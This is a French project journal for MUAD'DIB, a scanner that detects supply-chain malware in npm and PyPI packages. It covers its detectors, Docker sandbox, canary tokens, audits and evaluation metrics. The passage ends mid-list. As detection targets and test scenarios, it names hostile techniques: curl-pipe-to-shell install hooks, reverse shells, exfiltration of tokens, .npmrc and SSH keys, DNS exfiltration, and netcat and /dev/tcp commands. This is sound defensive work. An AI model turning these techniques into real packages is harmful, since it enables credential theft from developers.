# Carnet de Bord - Projet MUAD'DIB

**Scanner de sécurité npm & PyPI contre les attaques supply-chain**

DNSZLSK
Formation CDA - AFPA
Janvier - Fevrier 2026

---

## D'où vient ce projet ?

Novembre 2025. Je scrolle Reddit, section r/netsec. Un post attire mon attention : **"Shai-Hulud 2.0 : un ver npm a compromis 796 packages"**.

Je clique. Et là, je découvre l'ampleur du truc.

Ce ver, baptisé Shai-Hulud comme les vers géants de Dune, s'est propagé automatiquement via les dépendances npm. Il volait les tokens GitHub, npm, AWS, et les exfiltrait vers des repos publics marqués "Sha1-Hulud: The Second Coming". Plus de 25 000 dépôts GitHub touchés. Des boîtes comme Zapier, PostHog, Postman temporairement compromises.

Je me suis dit : "Et si je créais un outil pour détecter ça ?"

Pas pour concurrencer les gros. Socket, Snyk, ils ont des millions de funding et des équipes de 50 personnes. Juste pour avoir quelque chose de gratuit, open source, que n'importe quel dev peut installer en une commande.

Le nom s'est imposé naturellement : **MUAD'DIB**, le nom Fremen de Paul Atreides dans Dune, celui qui combat les vers géants.

---

## Première semaine : la base

### L'erreur du débutant

Mon premier réflexe a été de vouloir faire du machine learning. Entraîner un modèle pour détecter les patterns malveillants. Claude m'a recadré direct :

> "Oublie l'IA pour la v1. Concentre-toi sur l'analyse AST des comportements et l'intégration des IOCs existants. C'est moins sexy mais c'est ce qui protège réellement."

Il avait raison. Les attaquants de Shai-Hulud utilisent des patterns connus. Pas besoin de réinventer la roue.

### Ce que j'ai construit

Trois piliers :

**1. Matching IOC** : Une base de 225 000+ packages malveillants connus. Si ton projet en utilise un, alerte immédiate.

**2. Analyse AST** : Je parse le JavaScript avec acorn pour détecter les patterns suspects : `eval()`, `child_process`, lecture de `.npmrc`, etc.

**3. Détection typosquatting** : Distance de Levenshtein pour repérer les noms similaires aux packages populaires (`lodahs` vs `lodash`).

---

## Les galères

### 126 alertes sur React.js

Premier test sur le repo officiel de React. Résultat : **126 alertes**. Score de risque : 89/100.

Évidemment, React n'est pas un malware. Mon scanner détectait des trucs légitimes comme des faux positifs.

Exemples de ce qui déclenchait des alertes :

| Package | Détection | Réalité |
|---------|-----------|---------|
| esbuild | child_process.spawn() | Bundler natif légitime |
| sharp | postinstall script | Compilation binaire nécessaire |
| qs | IOC GitHub Advisory | CVE (vulnérabilité), pas malware |

J'ai passé trois jours à affiner les whitelists. Résultat final sur React : **1 alerte légitime** (un script postinstall de build). Score : 3/100.

### Le scraper qui casse

J'ai voulu automatiser la collecte d'IOCs depuis plusieurs sources : Datadog, Socket, Phylum, OSV, GitHub Advisory. Sauf que GitHub Advisory inclut des CVE (vulnérabilités), pas du malware.

Résultat : 54 faux positifs d'un coup. Le package `qs` (utilisé par Express) était flagué comme malveillant alors qu'il avait juste une CVE corrigée depuis longtemps.

J'ai dû retirer GitHub Advisory du scraper. MUAD'DIB est un scanner **anti-malware**, pas un scanner de vulnérabilités. Pour les CVE, il y a `npm audit` ou Snyk.

### Le sandbox Docker (analyse dynamique)

Après l'analyse statique, j'ai voulu aller plus loin : exécuter le code suspect dans un environnement isolé pour voir ce qu'il fait vraiment.

Le principe est simple :
1. Créer un container Docker éphémère
2. Installer le package dedans avec `npm install`
3. Capturer les comportements avec `strace` et `tcpdump`
4. Analyser : connexions réseau, accès fichiers sensibles, process suspects

Premier test sur `lodash` : aucun comportement suspect. Normal, c'est clean.

Le piège ? Les faux positifs. Mon premier scanner détectait "nc" (netcat) dans le nom de fichier `graceful-fs/clone.js`. J'ai dû affiner la détection pour chercher `/nc ` ou `netcat` en commande, pas en substring.

Le sandbox ne remplace pas Socket ou Aikido qui font ça à grande échelle avec du ML. Mais pour un dev qui veut vérifier un package inconnu avant de l'installer, c'est déjà ça.

---

## Ce que j'ai appris

### Techniquement

**Analyse AST avec acorn** : Parser du JavaScript pour comprendre son comportement, pas juste chercher des strings. Un `eval()` dans un fichier de config n'a pas la même signification qu'un `eval()` dans un postinstall.

**Distance de Levenshtein** : L'algorithme classique pour mesurer la similarité entre deux chaînes. Parfait pour détecter `axois` qui essaie de se faire passer pour `axios`.

**MITRE ATT&CK** : Le framework de référence pour classifier les techniques d'attaque. Chaque détection de MUAD'DIB est mappée sur une technique (T1195.002 pour supply chain, T1552.001 pour vol de credentials, etc.).

**SARIF** : Le format standard pour les résultats de scanners de sécurité. Permet l'intégration native dans GitHub Security.

**Docker et sandboxing** : Créer des containers éphémères pour analyser du code suspect. Utiliser `strace` pour tracer les appels système, `tcpdump` pour capturer le réseau.

**Publication npm et VS Code Marketplace** : Tout le workflow : versioning, 2FA, tokens, métadonnées.

### Humainement

Ce projet m'a fait réaliser qu'un dev solo peut avoir un impact réel en sécurité. Les outils commerciaux coûtent cher. Socket c'est gratuit pour l'open source, mais les features avancées sont payantes. MUAD'DIB ne les remplacera jamais, mais il offre une première ligne de défense gratuite.

J'ai aussi appris à être honnête sur les limites d'un projet. MUAD'DIB détecte les menaces *connues*. Pour les zero-day, il faut des outils qui font de l'analyse dynamique avancée, du ML, des trucs qui demandent des ressources que je n'ai pas.

---

## Audit et optimisations (Janvier 2026)

### L'audit Claude Code

Après la v1.2.5, j'ai demandé à Claude Code de faire un audit complet du projet. L'objectif : identifier ce qui manquait vraiment pour que MUAD'DIB soit "production-ready".

Le constat était sans appel :
- L'outil était techniquement solide mais manquait de **visibilité** (pas sur GitHub Marketplace, pas de badges)
- Aucune feature **différenciante** par rapport à Snyk ou Socket
- Les tests existaient mais sans **métriques de coverage**

### Les optimisations techniques

**Parallélisation des scanners** : Avant, les 11 scanners s'exécutaient séquentiellement. Maintenant ils tournent en parallèle avec `Promise.all()`. Gain de performance significatif sur les gros projets.

**Structures de données optimisées** : Remplacement des tableaux par des `Map` et `Set` pour les lookups IOC. Passage de O(n) à O(1) pour la recherche de packages malveillants.

**Cache SHA256** : Les hashes de fichiers sont maintenant cachés pour éviter de recalculer le même hash plusieurs fois dans un scan.

**Protection symlinks** : Ajout de `lstatSync` pour détecter les liens symboliques et éviter les boucles infinies ou l'accès à des fichiers hors scope.

**Fix XSS dans les rapports HTML** : Les données utilisateur sont maintenant échappées avec une fonction `escapeHtml()` dédiée.

**Standardisation anglais** : Tous les messages de sortie sont maintenant en anglais pour la cohérence internationale.

### La killer feature : `muaddib diff`

C'est LA feature que personne d'autre n'a. Ni Snyk, ni Socket, ni npm audit.

```bash
muaddib diff v1.2.0
```

Compare les menaces entre la version actuelle et un commit/tag précédent. Affiche **uniquement les NOUVELLES menaces** introduites depuis cette référence.

Pourquoi c'est important ? Parce qu'en vrai, les projets ont souvent de la dette technique de sécurité. Des alertes qu'on connaît mais qu'on n'a pas le temps de fixer. Avec `muaddib diff`, tu peux bloquer un PR uniquement si il **introduit** de nouveaux problèmes, sans être pollué par l'existant.

L'implémentation était pas triviale :
1. Cloner le repo dans un dossier temporaire
2. Checkout le commit de référence
3. Scanner les deux versions
4. Comparer les menaces avec un ID unique (type + fichier + message)
5. Afficher le delta

### Intégration pre-commit hooks

Pour que MUAD'DIB soit vraiment utile, il fallait qu'il s'intègre dans le workflow des devs. Pas juste un outil qu'on lance manuellement de temps en temps.

J'ai ajouté le support pour trois systèmes de hooks :

**Pre-commit framework** (le plus populaire) :
```yaml
repos:
  - repo: https://github.com/DNSZLSK/muad-dib
    rev: v1.6.11
    hooks:
      - id: muaddib-scan
```

**Husky** (très utilisé dans l'écosystème npm) :
```bash
npx husky add .husky/pre-commit "npx muaddib scan . --fail-on high"
```

**Git natif** :
```bash
muaddib init-hooks --type git
```

La commande `muaddib init-hooks` détecte automatiquement le système utilisé et configure le hook approprié.

### Distribution et crédibilité

**GitHub Action sur le Marketplace** : L'action existait mais n'était pas publiable. J'ai ajouté le branding (icône shield orange), les inputs/outputs documentés, et l'upload SARIF automatique.

**Coverage avec Codecov** : Les tests existaient mais personne ne pouvait voir le taux de couverture. Maintenant c'est visible avec un badge.

**OpenSSF Scorecard** : Le workflow analyse automatiquement les bonnes pratiques de sécurité du projet et affiche un badge de crédibilité.

---

## Hardening et testing avance (9 Fevrier 2026)

### Double audit de securite

La v1.3.0 etait fonctionnelle mais n'avait jamais subi d'audit de securite rigoureux. J'ai lance deux passes d'audit completes sur les 27 fichiers source :

**Audit v1** : 33 issues trouvees et corrigees. Les plus critiques :
- XSS dans les rapports HTML (donnees non echappees)
- Injection de commande potentielle dans `safe-install.js`
- Faux positifs sur les packages rehabilites (chalk, debug)
- Absence de validation des URLs webhook

**Audit v2** : 25 issues supplementaires. Les plus importantes :
- **YAML unsafe loading** : `yaml.load()` sans `JSON_SCHEMA` permettait l'execution de tags `!!js/function`. Corrige avec `{ schema: yaml.JSON_SCHEMA }` sur les 3 appels.
- **SSRF dans le fetcher IOC** : Les redirects HTTP n'etaient pas validees. Ajout de `isAllowedFetchRedirect()` avec whitelist de domaines et resolution des URLs relatives.
- **18 regles manquantes** dans `rules/index.js` : Les playbooks existaient mais n'etaient pas mappes. Ajout de `curl_pipe_sh`, `netcat_shell`, `shai_hulud_backdoor`, etc.
- **Performance** : Remplacement des `Array.find()` par des `Map`/`Set` pour lookup O(1) dans le merge IOC et le chargement YAML.

Au total : **58 issues corrigees**, coverage montee de 52% a 80%.

### Fuzzing (56 tests)

Creation d'une suite de fuzz tests pour verifier la robustesse des parsers :
- **YAML** : invalide, `!!js/function` bloque, vide, 10MB, unicode, null bytes, billion laughs, nesting 100 niveaux
- **JSON** : invalide, vide, cles 10000 chars, valeurs null, types incorrects, 10000 deps, prototype pollution
- **AST** : syntaxe invalide, binaire en .js, vide, commentaires seuls, null bytes, BOM, 100 niveaux de callbacks, ligne 500KB
- **CLI** : arguments 10000 chars, paths unicode, injection shell `$(...)`, flags conflictuels

Resultat : **56/56 pass**. Aucun crash, aucune exception non rattrapee.

### Adversarial testing (15/15)

Creation de 15 scenarios de packages malveillants realistes :
1. `postinstall curl | sh`
2. `preinstall` reverse shell
3. `child_process.exec` + base64 + eval
4. `readFileSync` credentials + fetch
5. `process.env.NPM_TOKEN` exfiltration
6. `eval()` avec concatenation dynamique
7. `Buffer.from` base64 + eval
8. `dns.lookup` exfiltration via env
9. Typosquatting `lodahs`/`axois`/`expres`
10. `.npmrc` read + HTTP POST
11. `~/.ssh/id_rsa` vol de cle SSH
12. Code obfusque `_0x` + hex escapes
13. Webhook suspect dans postinstall
14. Tampering package.json + vol credentials
15. Prototype pollution + eval

**Taux de detection : 15/15 (100%)**.

### Integration Codecov et ESLint Security

- **Codecov** : Workflow CI qui upload automatiquement le coverage. Badge visible dans les README.
- **ESLint security** : `eslint-plugin-security` avec 14 regles. 105/108 findings sont des faux positifs attendus (acces fichiers dynamiques = coeur du metier). 3 vrais findings identifies (2 regex ReDoS potentielles, 1 variable morte).

### Rapport d'audit PDF

Generation du rapport `MUADDIB_Security_Audit_Report_v1.4.1.pdf` documentant l'ensemble des audits, corrections, et resultats de tests. Ce document sert de preuve de diligence securite.

---

## Support Python/PyPI (Fevrier 2026)

### Ajout du support Python

Apres le support npm, j'ai etendu MUAD'DIB pour scanner les projets Python :

**Parsing des dependances** : `src/scanner/python.js` parse trois formats :
- `requirements.txt` (y compris `-r` recursif, extras, markers)
- `setup.py` (extraction `install_requires` et `setup_requires`)
- `pyproject.toml` (PEP 621 et Poetry)

**IOCs PyPI** : Le scraper telecharge le dump OSV PyPI (~14 000 packages malveillants MAL-*). Les packages sont verifies par nom exact avec normalisation PEP 503.

**Typosquatting PyPI** : Detection des noms similaires aux packages populaires (requests, numpy, flask, django, pandas, etc.) avec distance de Levenshtein et normalisation PEP 503 (tirets, underscores, points sont equivalents).

**Distinction update/scrape** : `muaddib update` est rapide (~5 secondes, charge les IOCs compacts du package + YAML + GitHub). `muaddib scrape` est complet (~5 minutes, telecharge les dumps OSV npm + PyPI + toutes les sources).

### Format IOC compact

**Probleme** : Le fichier `iocs.json` complet faisait 112MB apres le scraping de toutes les sources (OSV npm + PyPI + DataDog + OSSF + GitHub Advisory). Impossible a distribuer via npm (la limite est de 10MB).

**Solution** : Creation de `iocs-compact.json` avec un format optimise :
- **Wildcard patterns** : 87% des packages malveillants sont dangereux a toute version. Stockes dans un tableau `wildcards[]` au lieu de dupliquer les entrees par version.
- **Versioned entries** : Les 13% restants (packages compromis sur certaines versions seulement) sont stockes dans un objet `versioned{}` avec les plages de versions affectees.
- **Lookup O(1)** : Au chargement, `loadCachedIOCs()` convertit le format compact en `Map` et `Set` pour des lookups instantanes.

**Resultat** : 112MB → ~5MB. Le fichier `iocs-compact.json` est inclus dans le package npm et charge en memoire au demarrage.

---

## Audit securite v3/v4 (10-12 Fevrier 2026)

### Audit complementaire massif

Apres les 58 issues corrigees en v1.4.0/v1.4.1, un audit plus approfondi a revele **114 issues supplementaires** reparties sur 29 fichiers :

| Severite | Nombre |
|----------|--------|
| CRITICAL | 3 |
| HIGH | 18 |
| MEDIUM | 48 |
| LOW | 45 |

### Corrections en 5 waves

Les corrections ont ete appliquees en 5 waves successives pour limiter les regressions :

**Wave 1** : Issues CRITICAL et quick wins
- **Exit code overflow** : `process.exit(threats.length)` pouvait depasser 125 (limite POSIX). Corrige avec `Math.min(threats.length, 125)`.
- **`src/` exclu des scans** : Le scanner ne scannait pas son propre code source car `src/` etait dans les repertoires exclus. Corrige : `EXCLUDED_DIRS` ne contient plus `src`.
- Fuites de spinner (spinner non arrete en cas d'erreur).

**Waves 2-3** : Securite HIGH et scanners
- ReDoS dans `obfuscation.js` (regex catastrophique remplacee par approche programmatique)
- Protection prototype pollution dans `package.js` et `typosquat.js`
- Validation de noms npm dans `npm-registry.js` (prevention injection URL)
- Protection path traversal dans `python.js` (includes recursifs)
- `execFileSync` au lieu de `execSync` dans `diff.js` (prevention injection commande)

**Waves 4-5** : Infrastructure et peripheriques
- Ecriture atomique des fichiers IOC (`.tmp` puis `rename`)
- Memory bounds sur les reponses HTTP du scraper (200MB max)
- Validation des chemins de sortie dans `report.js` et `sarif.js`
- Nettoyage des watchers dans `watch.js` et `daemon.js`

### Audits complementaires

| Audit | Resultat |
|-------|----------|
| `npm audit` | 0 vulnerabilites connues |
| Scan de secrets | Clean (aucun token, cle, ou credential dans le code) |
| ESLint SAST | 0 erreurs (105 findings = faux positifs attendus, acces fichiers = coeur du metier) |
| Fuzzing | 56/56 pass, 0 crashes |
| Adversarial testing | 15/15 detection rate |

### CI pipeline

**GitHub Actions workflow** (`scan.yml`) :
- Checkout → Node 20 → `npm ci` → tests avec c8 coverage → upload Codecov → self-scan SARIF → upload GitHub Security
- Self-scan : `node bin/muaddib.js scan . --sarif results.sarif --exclude tests --exclude docker --exclude node_modules --fail-on critical`
- Les PR ne mergent plus sans CI vert. Plus de bypass admin.

**OpenSSF Scorecard** (`scorecard.yml`) :
- Analyse hebdomadaire des bonnes pratiques de securite
- Badge affiche dans les README

---

## Audit documentation et corrections (12 Fevrier 2026)

### Audit complet de la documentation

Un audit systematique de tous les fichiers de documentation (README.md, README.fr.md, CHANGELOG.md, SECURITY.md, docs/threat-model.md, CONTRIBUTING.md, docs/CARNET_DE_BORD_MUADDIB.md) a revele **23 issues** :

| Severite | Nombre | Exemples |
|----------|--------|----------|
| CRITICAL | 3 | SECURITY.md: domaines webhook faux, CHANGELOG arrete a v1.2.7 |
| HIGH | 7 | "npm only" alors que PyPI est supporte, compteurs tests/scanners obsoletes |
| MEDIUM | 5 | Table des versions, heading FR non traduit, MITRE incomplet |
| LOW | 8 | Pre-commit rev v1.4.1, noms de fichiers traduits, cosmétique |

### 4 commits de corrections

1. **SECURITY.md** : Domaines webhook corriges (discord.com, discordapp.com, hooks.slack.com — suppression de webhook.site et localhost), "npm and PyPI only", table des versions (1.6.x/1.5.x supported), "7 production dependencies"
2. **Compteurs** : "296 tests" et "11 scanners" mis a jour dans les 5 fichiers (README, README.fr, CHANGELOG, CARNET, threat-model)
3. **CHANGELOG** : 16 versions reconstituees (v1.3.0 → v1.6.11) a partir de l'historique git reel
4. **Corrections mineures** : `## Fonctionnalites` (FR), `rev: v1.6.11` (pre-commit), 7 techniques MITRE ajoutees au threat-model, section Python/PyPI dans CONTRIBUTING.md

Toutes les docs sont maintenant synchronisees avec le code v1.6.11.

---

## Moniteur Zero-Day et alertes Discord (13 Fevrier 2026)

### Le probleme

MUAD'DIB savait scanner des projets existants, mais ne pouvait pas surveiller les nouveaux packages en temps reel. Les attaques supply-chain comme Shai-Hulud se propagent en quelques heures. Le temps de faire un `muaddib scan` manuellement, c'est deja trop tard.

### La solution

Un moniteur continu interne (infrastructure VPS) qui :
1. **Interroge les registres** npm et PyPI toutes les 60 secondes via RSS
2. **Telecharge et scanne** chaque nouveau package automatiquement
3. **Envoie des alertes Discord** en temps reel avec des embeds riches (couleur par severite, emoji, lien vers le package, score sandbox)
4. **Genere un rapport quotidien** (resume 24h : packages scannes, clean, suspects, erreurs, top 3 suspects)

### Les galeres techniques

**L'endpoint npm deprecie** : Au debut, le moniteur utilisait `/-/all/since?startkey=<timestamp>` pour recuperer les nouveaux packages npm. Cet endpoint a ete supprime (404). Migration vers le flux RSS `/-/rss?descending=true&limit=50`, avec le meme parsing regex que PyPI.

**Crash PyPI ECONNREFUSED** : Le flux RSS PyPI ne fournit pas l'URL du tarball. Le code appelait `scanPackage()` directement avec `tarballUrl: null`, ce qui tentait un download sur `null` et crashait. Corrige avec `resolveTarballAndScan()` qui resout l'URL via l'API JSON PyPI/npm avant le scan.

**Webhook Discord 400** : `formatDiscord()` attendait `summary.riskScore` et `summary.riskLevel`, mais `trySendWebhook()` passait le `result.summary` brut du scanner (qui n'a pas ces champs). Ajout de `computeRiskScore()` et `computeRiskLevel()` dans le moniteur pour calculer ces valeurs avant l'envoi.

**Faux positifs bundled tooling** : Beaucoup de packages npm incluent des fichiers bundles (yarn.js, webpack.js, terser.js, polyfills.js) qui declenchent des alertes d'obfuscation ou d'eval. Ajout d'un filtre `KNOWN_BUNDLED_FILES` : si TOUTES les findings viennent de ces fichiers, le package est marque comme "skipped (bundled tooling)" au lieu de "suspect".

### Bilan

Le moniteur scanne en moyenne un package toutes les 2-3 secondes. Sur une journee, ca represente ~2000-3000 packages. Les alertes Discord arrivent en temps reel avec suffisamment de contexte (lien package, severite, score sandbox) pour prendre une decision rapide.

---

## MUAD'DIB 2.0 — Supply Chain Anomaly Detector (13 Fevrier 2026)

### Le constat

MUAD'DIB v1.x etait solide pour detecter les menaces **connues** : 225 000+ IOCs, 12 scanners paralleles, sandbox Docker, moniteur zero-day. Mais un probleme fondamental restait : l'outil etait 100% reactif. Si une attaque n'etait pas encore dans la base IOC, elle passait a travers.

Les attaques comme ua-parser-js (2021) ou event-stream (2018) ont ete detectees des heures ou des jours apres la compromission initiale. Pendant ce temps, des milliers de devs avaient deja installe les versions malveillantes.

### Le changement de paradigme

En cherchant comment les outils comme Socket.dev et Phylum detectent les 0-days, j'ai identifie un pattern commun : **l'analyse comportementale entre versions**. Au lieu de chercher si un package est dans une liste noire, on compare ce qui a change entre la version N et la version N-1. Si un package qui n'avait jamais de `postinstall` en ajoute un soudainement, c'est un signal fort.

En etudiant les attaques supply-chain recentes (Shai-Hulud, ua-parser-js, coa, eslint-scope) et les techniques de detection de Socket.dev, Phylum et AWS Security, j'ai identifie 5 features cles pour la detection comportementale :

### Les 5 features

**1. Detection soudaine de scripts lifecycle** (`--temporal`)
Compare les scripts `preinstall`/`install`/`postinstall` entre les deux dernieres versions d'un package. Si un script d'installation apparait dans une version qui n'en avait pas, c'est le signal #1 des attaques supply-chain.

**2. Diff AST temporel** (`--temporal-ast`)
Telecharge les deux dernieres versions de chaque dependance, extrait les fichiers JS, parse les ASTs avec acorn, et detecte les APIs dangereuses nouvellement ajoutees : `child_process`, `eval`, `Function`, `net.connect`, `process.env`, `fetch`.

**3. Anomalie de frequence de publication** (`--temporal-publish`)
Analyse l'historique de publication : rafales de versions en 24h (compromission automatisee), package dormant depuis 6+ mois avec une nouvelle version soudaine (takeover), succession rapide (CI/CD compromis).

**4. Detection de changement de maintainer** (`--temporal-maintainer`)
Compare les maintainers entre versions : nouveau maintainer ajoute, seul maintainer remplace (pattern event-stream), noms suspects (generiques, auto-generes), nouveau publisher.

**5. Canary tokens / honey tokens** (sandbox)
Injecte de faux credentials (GITHUB_TOKEN, NPM_TOKEN, cles AWS) dans l'environnement sandbox. Si le package tente de les exfiltrer via HTTP, DNS, ou stdout, c'est la preuve directe de malveillance.

### Refactoring des tests

Avant v2.0, tous les tests etaient dans un seul fichier `tests/run-tests.js` de 4000 lignes. C'etait devenu ingerable. Refactoring en 16 fichiers modulaires :
- `tests/run-tests.js` (orchestrateur)
- `tests/integration/cli.test.js`, `monitor.test.js`
- `tests/sandbox/sandbox.test.js`
- `tests/temporal/` (temporal, ast-diff, publish, maintainer, canary-tokens)
- etc.

Passage de 370 a **541 tests**.

### Impact

MUAD'DIB peut maintenant detecter des 0-days comportementaux sans IOC. Les 5 features auraient detecte :
- **Shai-Hulud** (2025) : temporal lifecycle + AST diff
- **ua-parser-js** (2021) : changement maintainer + lifecycle
- **event-stream** (2018) : changement seul maintainer + AST diff
- **coa/rc** (2021) : rafale de publications + lifecycle

Approche inspiree de Socket.dev et Phylum, adaptee a un outil CLI open source gratuit.

---

## MUAD'DIB 2.1 — Validation & Observabilite (14 Fevrier 2026)

### Le constat

MUAD'DIB 2.0 avait la detection : 12 scanners statiques, 5 features comportementales, sandbox Docker. Mais une question restait sans reponse : **est-ce que ca marche vraiment ?**

Pas de metriques de faux positifs. Pas de validation contre des attaques reelles. Pas de suivi des temps de detection. Pas moyen de savoir si le scanner s'ameliore ou se degrade au fil des versions.

### Les 5 features de validation

**1. Ground Truth Dataset** (`muaddib replay`)
Un dataset de 5 attaques supply-chain reelles avec les fixtures associees :

| Attaque | Annee | Technique | Attendu |
|---------|-------|-----------|---------|
| event-stream | 2018 | flatmap-stream malveillant | 2 CRITICAL (IOC match) |
| ua-parser-js | 2021 | Script lifecycle injecte | 1 MEDIUM (lifecycle) |
| coa | 2021 | Lifecycle + obfuscation JS | 1 HIGH + 1 MEDIUM |
| node-ipc | 2022 | Protestware malveillant | 2 CRITICAL (IOC match) |
| colors | 2022 | Protestware (boucle infinie) | Hors scope |

Le replay execute le scanner sur chaque fixture et verifie que les findings attendus sont presents. Resultat : **100% de detection** (4/4 malware + 1 hors scope correctement classifie).

**2. Detection Time Logging** (`muaddib detections`)
Chaque detection est enregistree avec un timestamp `first_seen_at`. Quand une advisory publique est emise (OSV, GitHub Advisory), on peut calculer le **lead time** : combien de temps avant l'advisory publique MUAD'DIB avait detecte la menace.

**3. FP Rate Tracking** (`muaddib stats`)
Suivi quotidien des resultats de scan : total/clean/suspect/faux positif/confirme malveillant. Le taux de faux positifs est calcule automatiquement : `FP / (FP + Confirme)`.

**4. Score Breakdown** (`--breakdown`)
Decomposition explicable du score de risque : chaque finding montre sa contribution au score total avec les poids par severite (CRITICAL=25, HIGH=10, MEDIUM=3, LOW=1).

**5. Threat Feed API** (`muaddib feed` / `muaddib serve`)
Export des detections en flux JSON pour integration SIEM. `muaddib serve` demarre un serveur HTTP localhost avec `GET /feed` et `GET /health`.

### Augmentation massive du coverage

Le coverage est passe de ~65% a **74%** avec 168 nouveaux tests :

| Module | Avant | Apres | Tests ajoutes |
|--------|-------|-------|---------------|
| `src/diff.js` | 45% | ~75% | 35 (nouveau fichier test) |
| `src/temporal-ast-diff.js` | 50% | ~70% | 20 |
| `src/monitor.js` | 44% | ~60% | 21 |
| Ground truth | - | 100% | 12 |
| Total | 541 | **709** | +168 |

Les fonctions internes de `diff.js` (`getThreatId`, `compareThreats`, `resolveRef`, `SAFE_REF_REGEX`) ont ete exportees pour permettre le test unitaire.

### Bilan

v2.1 est la version "observabilite". MUAD'DIB ne se contente plus de detecter : il prouve sa propre efficacite avec des metriques. Le ground truth sert aussi de test de non-regression : si un futur changement casse la detection d'une attaque reelle, les tests echouent.

---

## MUAD'DIB 2.1.2 — Sandbox CI-aware & Hardening securite (14 Fevrier 2026)

### Le probleme des malwares CI-aware

Certains malwares supply-chain sont plus intelligents que prevu : ils detectent s'ils s'executent dans un environnement CI/CD avant d'activer leur payload. Si la variable `CI` ou `GITHUB_ACTIONS` n'est pas definie, ils restent dormants. Notre sandbox Docker ne simulait pas un environnement CI, donc ces malwares passaient a travers.

### Solution : simulation CI dans le sandbox

Le `sandbox-runner.sh` simule maintenant 6 environnements CI differents :

```bash
export CI=true
export GITHUB_ACTIONS=true
export GITLAB_CI=true
export TRAVIS=true
export CIRCLECI=true
export JENKINS_URL=http://localhost:8080
```

Les malwares qui testent `if (process.env.CI)` ou `if (process.env.GITHUB_ACTIONS)` declenchent maintenant leur payload dans notre sandbox, ce qui permet leur detection.

### Canary tokens enrichis

Le sandbox injecte maintenant 6 canary tokens (faux secrets) comme honeypots :
- `GITHUB_TOKEN` / `NPM_TOKEN` — Tokens de registre
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` — Credentials cloud
- `SLACK_WEBHOOK_URL` / `DISCORD_WEBHOOK_URL` — Webhooks messaging

Le systeme de detection est en double couche :
1. **Tokens dynamiques** : Generes aleatoirement par `canary-tokens.js` a chaque session sandbox, injectes via Docker `-e`
2. **Tokens statiques** : Valeurs fallback dans `sandbox-runner.sh` avec pattern `${VAR:-default}`, detectes par `detectStaticCanaryExfiltration()` dans `sandbox.js`

L'exfiltration est recherchee dans 7 vecteurs : corps HTTP, requetes DNS, URLs HTTP, connexions TLS, modifications filesystem, commandes processus, et sortie d'installation.

### Hardening securite

**Protection SSRF** : Centralisation du download dans `src/shared/download.js` avec validation stricte des domaines (registres npm/PyPI uniquement), blocage des IP privees (127.x, 10.x, 172.16-31.x, 192.168.x, IPv6 loopback), et verification des redirections.

**Prevention injection de commande** : Remplacement de `execSync` avec template literals par `execFileSync` avec arguments en tableau pour l'extraction tar. Centralisation de `NPM_PACKAGE_REGEX` dans `src/shared/constants.js`.

**Sanitization des paths** : `sanitizePackageName()` supprime les sequences `..` pour prevenir le path traversal.

**JSON.parse protege** : Les 2 appels `JSON.parse` non proteges dans `monitor.js` et `sandbox.js` sont maintenant dans des blocs try/catch.

**Webhook strict** : Les alertes webhook ne se declenchent plus que pour les menaces confirmees (IOC match, sandbox confirm, canary exfiltration), pas pour les heuristiques basse confiance.

### Bilan

+33 nouveaux tests (14 canary + 10 SSRF + 9 security), passage de 709 a **742 tests**. La securite interne de l'outil est maintenant aussi rigoureuse que sa capacite de detection.

---

## MUAD'DIB 2.2 — Evaluation et Red Team / Blue Team (20 Fevrier 2026)

### Le constat

MUAD'DIB avait des metriques de validation ponctuelles (ground truth replay, fuzzing, adversarial testing) mais pas de **commande unifiee** pour mesurer l'efficacite globale du scanner. Impossible de repondre simplement a : "Quel est le taux de faux positifs ? Quel est le taux de detection sur des attaques evasives ?"

### La commande `muaddib evaluate`

Creation d'une commande qui mesure 3 axes :

**1. True Positive Rate (TPR)** — Ground Truth
Scan des 4 attaques supply-chain reelles (event-stream, ua-parser-js, coa, node-ipc). Un score >= 3 = detecte.

**2. False Positive Rate (FPR)** — Benign
Scan de 98 packages npm populaires (express, react, lodash, webpack, etc.) dans des projets temporaires. Un score > 20 = faux positif.

**3. Adversarial Detection Rate (ADR)** — Adversarial
Scan de 7 echantillons malveillants evasifs, chacun avec un seuil de detection specifique :

| Echantillon | Technique | Seuil | Score |
|-------------|-----------|-------|-------|
| ci-trigger-exfil | Exfiltration conditionelle CI | 35 | 38 |
| delayed-exfil | setTimeout + credentials theft | 30 | 35 |
| docker-aware | Detection sandbox + curl\|sh | 25 | 25 |
| staged-fetch | Fetch remote + eval() | 35 | 35 |
| dns-chunk-exfil | Exfiltration DNS par chunks | 35 | 35 |
| string-concat-obfuscation | require() avec concatenation | 10 | 10 |
| postinstall-download | Lifecycle + require('https') | 30 | 33 |

### Red Team / Blue Team

Le baseline initial etait catastrophique : TPR 0%, ADR 14%. Le processus Red Team / Blue Team a permis d'identifier et combler les lacunes :

**Ameliorations scanner AST** (`src/scanner/ast.js`) :
- Detection des `require()` avec `BinaryExpression` (concatenation de strings = obfuscation)
- Detection des `exec()`/`execSync()` avec commandes shell dangereuses (pipe vers sh, netcat, /dev/tcp)

**Ameliorations scanner dataflow** (`src/scanner/dataflow.js`) :
- Resolution DNS (dns.resolve, dns.lookup) reconnue comme sink d'exfiltration
- `eval()` suivi comme sink de type `eval_exec`
- Detection de payload staged : network fetch + eval() dans le meme fichier

**Ameliorations scanner package** (`src/scanner/package.js`) :
- `require('https')` / `require('http')` dans les lifecycle scripts
- `node -e` dans les lifecycle scripts

5 nouvelles regles ajoutees : MUADDIB-AST-006, AST-007, FLOW-002, PKG-006, PKG-007.

### Resultats initiaux

| Metrique | Valeur | Details |
|----------|--------|---------|
| **TPR** (Ground Truth) | **100%** (4/4) | event-stream, ua-parser-js, coa, node-ipc |
| **FPR** (Benign) | **0%** (0/98) | Aucun faux positif sur 98 packages populaires |
| **ADR** (Adversarial) | **100%** (7/7) | 7 echantillons evasifs detectes |

Les metriques sont sauvegardees dans `metrics/v2.1.5.json` pour le suivi de regression.

### Tests

770 tests unitaires, 0 echecs, 1 skip (Windows).

---

## MUAD'DIB 2.2 — Red Team / Blue Team complet (20 Fevrier 2026)

### Audit structure et nettoyage

Avant de lancer les vagues adversariales avancees, un audit complet de la structure du projet :
- Retrait de `muaddib monitor` de la CLI publique et du menu interactif (commande interne infrastructure)
- Nettoyage des fichiers obsoletes (logos dupliques, test-output.txt, anciens VSIX)
- Creation du framework d'evaluation unifie (`src/commands/evaluate.js`)

### Framework d'evaluation

Creation de `muaddib evaluate` — une commande unique qui mesure 3 axes :
1. **TPR** (True Positive Rate) : 4 attaques reelles (event-stream, ua-parser-js, coa, node-ipc)
